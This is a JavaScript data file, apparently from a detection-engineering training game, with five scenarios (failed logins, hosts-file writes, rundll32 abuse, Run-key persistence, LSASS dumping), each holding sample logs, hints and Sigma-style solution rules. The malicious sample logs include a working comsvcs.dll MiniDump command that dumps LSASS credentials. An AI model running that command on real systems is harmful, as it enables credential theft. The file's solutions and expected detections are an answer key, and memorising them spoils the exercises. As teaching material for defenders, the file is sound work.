          <h3 class="font-bold text-red-400">Incident Report #013</h3>
          <p class="text-sm text-gray-400">Priority: <span class="text-red-500">HIGH</span></p>
        </div>
        <p><strong>Intelligence:</strong> Multiple failed login attempts detected from external IP addresses.</p>
        <p><strong>Objective:</strong> Detect failed logins (Status: 0xC000006D) from non-internal IP addresses.</p>
      </div>
    `,
    logs: [
      {
        id: 13001,
        timestamp: 'Nov 08 13:00:00',
        host: 'DC01',
        severity: 'INFO',
        logSource: 'authentication',
        targetUser: 'admin',
        targetDomain: 'CORP',
        logonType: '3',
        sourceIP: '192.168.1.100',
        status: '0x0',
        success: true,
        malicious: false
      },
      {
        id: 13002,
        timestamp: 'Nov 08 13:01:00',
        host: 'DC01',
        severity: 'WARN',
        logSource: 'authentication',
        targetUser: 'administrator',
        targetDomain: 'CORP',
        logonType: '10',
        sourceIP: '45.33.32.156',
        status: '0xC000006D',
        failureReason: 'Unknown user name or bad password',
        success: false,
        malicious: true
      },
      {
        id: 13003,
        timestamp: 'Nov 08 13:05:00',
        host: 'DC01',
        severity: 'INFO',
        logSource: 'authentication',
        targetUser: 'svc_backup',
        targetDomain: 'CORP',
        logonType: '5',
        sourceIP: '192.168.1.50',
        status: '0x0',
        success: true,
        malicious: false
      }
    ],
    hints: [
      { cost: 50, content: 'Look for failed login status code 0xC000006D' },
      { cost: 100, content: 'Filter on Status containing the failure code' },
      { cost: 200, content: 'detection:\\n  selection:\\n    Status: \'0xC000006D\'\\n  condition: selection', isSolution: true }
    ],
    expectedDetections: [13002],
    starterCode: `# Detect failed login attempts

detection:
  selection:
    # Add your detection logic here
  condition: selection`
  },

  // Scenario 14: Hosts File Modification
  {
    id: 'L1-014',
    title: 'DNS Hijack via Hosts',
    level: 1,
    difficulty: 2,
    logSource: 'file',
    mitre: {
      tactic: 'Impact',
      tacticId: 'TA0040',
      technique: 'T1565.001',
      techniqueName: 'Data Manipulation: Stored Data Manipulation',
      url: 'https://attack.mitre.org/techniques/T1565/001/'
    },
    realWorldReference: {
      incidents: ['Banking trojans', 'Adware', 'Cryptocurrency miners'],
      description: 'Modifying the hosts file allows attackers to redirect legitimate domains to malicious servers.',
      year: '2005-Present'
    },
    briefing: `
      <div class="space-y-4">
        <div class="border-l-4 border-orange-500 pl-4">
          <h3 class="font-bold text-orange-400">Incident Report #014</h3>
          <p class="text-sm text-gray-400">Priority: <span class="text-yellow-400">MEDIUM</span></p>
        </div>
        <p><strong>Intelligence:</strong> The Windows hosts file is being modified. This could redirect traffic to malicious servers.</p>
        <p><strong>Objective:</strong> Detect file modifications to the hosts file.</p>
      </div>
    `,
    logs: [
      {
        id: 14001,
        timestamp: 'Nov 09 14:00:00',
        host: 'WORKSTATION-01',
        severity: 'INFO',
        logSource: 'file',
        processName: 'notepad.exe',
        targetFilename: 'C:\\Users\\admin\\Documents\\notes.txt',
        operation: 'Write',
        malicious: false
      },
      {
        id: 14002,
        timestamp: 'Nov 09 14:05:00',
        host: 'WORKSTATION-08',
        severity: 'CRIT',
        logSource: 'file',
        processName: 'powershell.exe',
        targetFilename: 'C:\\Windows\\System32\\drivers\\etc\\hosts',
        operation: 'Write',
        malicious: true
      },
      {
        id: 14003,
        timestamp: 'Nov 09 14:10:00',
        host: 'DEV-PC',
        severity: 'INFO',
        logSource: 'file',
        processName: 'code.exe',
        targetFilename: 'C:\\Projects\\app\\config.json',
        operation: 'Write',
        malicious: false
      }
    ],
    hints: [
      { cost: 50, content: 'Look for writes to the hosts file path' },
      { cost: 100, content: 'Filter TargetFilename containing "hosts" in drivers\\etc path' },
      { cost: 200, content: 'detection:\\n  selection:\\n    TargetFilename|contains: \'drivers\\\\etc\\\\hosts\'\\n  condition: selection', isSolution: true }
    ],
    expectedDetections: [14002],
    starterCode: `# Detect hosts file modification

detection:
  selection:
    # Add your detection logic here
  condition: selection`
  },

  // Scenario 15: Rundll32 Abuse
  {
    id: 'L1-015',
    title: 'DLL Proxy Execution',
    level: 1,
    difficulty: 3,
    logSource: 'process_creation',
    mitre: {
      tactic: 'Defense Evasion',
      tacticId: 'TA0005',
      technique: 'T1218.011',
      techniqueName: 'Signed Binary Proxy Execution: Rundll32',
      url: 'https://attack.mitre.org/techniques/T1218/011/'
    },
    realWorldReference: {
      incidents: ['Emotet', 'Qakbot', 'IcedID'],
      description: 'Rundll32 is used to execute DLL files and can load malicious code from unusual paths or URLs.',
      year: '2015-Present'
    },
    briefing: `
      <div class="space-y-4">
        <div class="border-l-4 border-red-500 pl-4">
          <h3 class="font-bold text-red-400">Incident Report #015</h3>
          <p class="text-sm text-gray-400">Priority: <span class="text-red-500">HIGH</span></p>
        </div>
        <p><strong>Intelligence:</strong> Rundll32 is executing DLLs from unusual locations like temp folders.</p>
        <p><strong>Objective:</strong> Detect rundll32.exe loading DLLs from temp or user profile directories.</p>
      </div>
    `,
    logs: [
      {
        id: 15001,
        timestamp: 'Nov 10 15:00:00',
        host: 'WORKSTATION-01',
        severity: 'INFO',
        image: 'C:\\Windows\\System32\\rundll32.exe',
        commandLine: 'rundll32.exe shell32.dll,Control_RunDLL',
        user: 'CORP\\user1',
        malicious: false
      },
      {
        id: 15002,
        timestamp: 'Nov 10 15:05:00',
        host: 'WORKSTATION-10',
        severity: 'CRIT',
        image: 'C:\\Windows\\System32\\rundll32.exe',
        commandLine: 'rundll32.exe C:\\Users\\victim\\AppData\\Local\\Temp\\malware.dll,DllMain',
        user: 'CORP\\victim',
        malicious: true
      },
      {
        id: 15003,
        timestamp: 'Nov 10 15:10:00',
        host: 'ADMIN-PC',
        severity: 'INFO',
        image: 'C:\\Windows\\System32\\rundll32.exe',
        commandLine: 'rundll32.exe printui.dll,PrintUIEntry /in /n\\\\printserver\\printer1',
        user: 'CORP\\admin',
        malicious: false
      }
    ],
    hints: [
      { cost: 50, content: 'Look for Temp folder paths in rundll32 commands' },
      { cost: 100, content: 'Filter on rundll32.exe with Temp or AppData\\Local\\Temp in CommandLine' },
      { cost: 200, content: 'detection:\\n  selection:\\n    Image|endswith: \'rundll32.exe\'\\n    CommandLine|contains:\\n      - \'\\\\Temp\\\\\'\\n      - \'\\\\AppData\\\\Local\\\\Temp\\\\\'\\n  condition: selection', isSolution: true }
    ],
    expectedDetections: [15002],
    starterCode: `# Detect rundll32 loading suspicious DLLs

detection:
  selection:
    # Add your detection logic here
  condition: selection`
  },

  // Scenario 16: Registry Run Key Persistence
  {
    id: 'L1-016',
    title: 'Registry Persistence',
    level: 1,
    difficulty: 3,
    logSource: 'registry',
    mitre: {
      tactic: 'Persistence',
      tacticId: 'TA0003',
      technique: 'T1547.001',
      techniqueName: 'Boot or Logon Autostart Execution: Registry Run Keys',
      url: 'https://attack.mitre.org/techniques/T1547/001/'
    },
    realWorldReference: {
      incidents: ['Most malware families', 'APT groups'],
      description: 'Registry Run keys are commonly used by malware to persist and execute on system startup or user logon.',
      year: '2000-Present'
    },
    briefing: `
      <div class="space-y-4">
        <div class="border-l-4 border-purple-500 pl-4">
          <h3 class="font-bold text-purple-400">Incident Report #016</h3>
          <p class="text-sm text-gray-400">Priority: <span class="text-red-500">HIGH</span></p>
        </div>
        <p><strong>Intelligence:</strong> Registry Run keys are being modified for persistence. This is a classic malware technique.</p>
        <p><strong>Objective:</strong> Detect modifications to CurrentVersion\\Run registry keys.</p>
      </div>
    `,
    logs: [
      {
        id: 16001,
        timestamp: 'Nov 11 16:00:00',
        host: 'WORKSTATION-01',
        severity: 'INFO',
        logSource: 'registry',
        processName: 'setup.exe',
        targetObject: 'HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\MyApp',
        eventType: 'SetValue',
        details: 'DisplayName = My Application',
        malicious: false
      },
      {
        id: 16002,
        timestamp: 'Nov 11 16:05:00',
        host: 'WORKSTATION-12',
        severity: 'CRIT',
        logSource: 'registry',
        processName: 'malware.exe',
        targetObject: 'HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run',
        eventType: 'SetValue',
        details: 'UpdateService = C:\\Temp\\malware.exe',
        malicious: true
      },
      {
        id: 16003,
        timestamp: 'Nov 11 16:10:00',
        host: 'ADMIN-PC',
        severity: 'INFO',
        logSource: 'registry',
        processName: 'regedit.exe',
        targetObject: 'HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer',
        eventType: 'SetValue',
        details: 'ShellState = binary data',
        malicious: false
      }
    ],
    hints: [
      { cost: 50, content: 'Look for CurrentVersion\\Run in the registry path' },
      { cost: 100, content: 'Filter on TargetObject containing CurrentVersion\\Run' },
      { cost: 200, content: 'detection:\\n  selection:\\n    TargetObject|contains: \'CurrentVersion\\\\Run\'\\n    EventType: \'SetValue\'\\n  condition: selection', isSolution: true }
    ],
    expectedDetections: [16002],
    starterCode: `# Detect registry run key persistence

detection:
  selection:
    # Add your detection logic here
  condition: selection`
  },

  // Scenario 17: LSASS Access for Credential Theft
  {
    id: 'L1-017',
    title: 'LSASS Memory Access',
    level: 1,
    difficulty: 3,
    logSource: 'process_creation',
    mitre: {
      tactic: 'Credential Access',
      tacticId: 'TA0006',
      technique: 'T1003.001',
      techniqueName: 'OS Credential Dumping: LSASS Memory',
      url: 'https://attack.mitre.org/techniques/T1003/001/'
    },
    realWorldReference: {
      incidents: ['Mimikatz', 'APT28', 'APT29', 'Most ransomware'],
      description: 'Attackers dump LSASS memory to extract credentials. Tools like Mimikatz are commonly used.',
      year: '2012-Present'
    },
    briefing: `
      <div class="space-y-4">
        <div class="border-l-4 border-red-500 pl-4">
          <h3 class="font-bold text-red-400">Incident Report #017</h3>
          <p class="text-sm text-gray-400">Priority: <span class="text-red-500 font-bold">CRITICAL</span></p>
        </div>
        <p><strong>Intelligence:</strong> Credential dumping detected! Attackers are accessing LSASS memory to steal credentials.</p>
        <p><strong>Objective:</strong> Detect processes accessing lsass.exe memory, particularly using rundll32 with comsvcs.dll (MiniDump technique).</p>
      </div>
    `,
    logs: [
      {
        id: 17001,
        timestamp: 'Nov 12 17:00:00',
        host: 'DC01',
        severity: 'INFO',
        image: 'C:\\Windows\\System32\\lsass.exe',
        commandLine: 'C:\\Windows\\system32\\lsass.exe',
        user: 'NT AUTHORITY\\SYSTEM',
        malicious: false
      },
      {
        id: 17002,
        timestamp: 'Nov 12 17:05:00',
        host: 'WORKSTATION-15',
        severity: 'CRIT',
        image: 'C:\\Windows\\System32\\rundll32.exe',
        commandLine: 'rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump 672 C:\\temp\\lsass.dmp full',
        user: 'NT AUTHORITY\\SYSTEM',
        malicious: true
      },
      {
        id: 17003,
        timestamp: 'Nov 12 17:10:00',
        host: 'ADMIN-PC',
        severity: 'INFO',
        image: 'C:\\Windows\\System32\\taskmgr.exe',
        commandLine: 'taskmgr.exe /4',
        user: 'CORP\\admin',
        malicious: false
      }
    ],
    hints: [
      { cost: 50, content: 'Look for comsvcs.dll with MiniDump in the command line' },
      { cost: 100, content: 'Filter on rundll32 with comsvcs.dll and MiniDump' },
      { cost: 200, content: 'detection:\\n  selection:\\n    Image|endswith: \'rundll32.exe\'\\n    CommandLine|contains|all:\\n      - \'comsvcs.dll\'\\n      - \'MiniDump\'\\n  condition: selection', isSolution: true }
    ],
    expectedDetections: [17002],
    starterCode: `# Detect LSASS memory dumping

detection:
  selection:
    # Add your detection logic here
  condition: selection`
  }
];

export default LEVEL_1_SCENARIOS;
